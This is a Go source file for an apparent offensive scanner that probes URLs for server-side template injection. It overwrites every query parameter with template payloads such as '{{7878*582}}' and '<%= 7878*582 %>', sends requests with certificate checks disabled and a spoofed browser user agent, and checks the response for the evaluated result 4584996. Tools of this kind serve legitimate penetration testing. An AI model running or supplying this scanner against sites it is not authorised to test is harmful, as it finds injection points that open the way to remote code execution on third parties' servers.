package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"math/rand"
	"time"
	"net/url"
	"crypto/tls"
)

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	userAgent := generateRandomUserAgent()

	for scanner.Scan() {
		inputURL := scanner.Text()

		parsedURL, err := url.Parse(inputURL)
		if err != nil {
			fmt.Printf("Error parsing the URL: %v\n", err)
			continue
		}

		if !parsedURL.IsAbs() {
			fmt.Printf("Invalid URL: %s is not an absolute URL\n", inputURL)
			continue
		}

		injectedValues := []string{"{{7878*582}}", "<%= 7878*582 %>", "${{7878*582}}", "#{7878*582}", "*{7878*582}", "${7878*582}."}

		fmt.Printf("URL: %s\n", parsedURL)

		for _, value := range injectedValues {
			injectedURL := replaceParamValue(parsedURL, value)
			processURL(userAgent, injectedURL, value)
		}
	}
}

func processURL(userAgent string, parsedURL *url.URL, injectedValue string) {
	// Create an HTTP client with certificate verification disabled
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequest("GET", parsedURL.String(), nil)
	if err != nil {
		fmt.Printf("Error creating the request: %v\n", err)
		return
	}
	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending the request: %v\n", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading the response: %v\n", err)
		return
	}

	fmt.Printf("Injected Value: %s\n", injectedValue)

	if strings.Contains(string(body), "4584996") {
		fmt.Println("4584996 reflection is found\n")
	} else {
		fmt.Println("No 4584996 reflection\n")
	}
}

func generateRandomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/52.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Safari/602.4.8",
	}

	rand.Seed(time.Now().UnixNano())
	randomIndex := rand.Intn(len(userAgents))

	return userAgents[randomIndex]
}

func replaceParamValue(parsedURL *url.URL, value string) *url.URL {
	queryValues, err := url.ParseQuery(parsedURL.RawQuery)
	if err != nil {
		fmt.Printf("Error parsing query: %v\n", err)
		return parsedURL
	}

	for key := range queryValues {
		queryValues.Set(key, value)
	}

	parsedURL.RawQuery = queryValues.Encode()

	return parsedURL
}
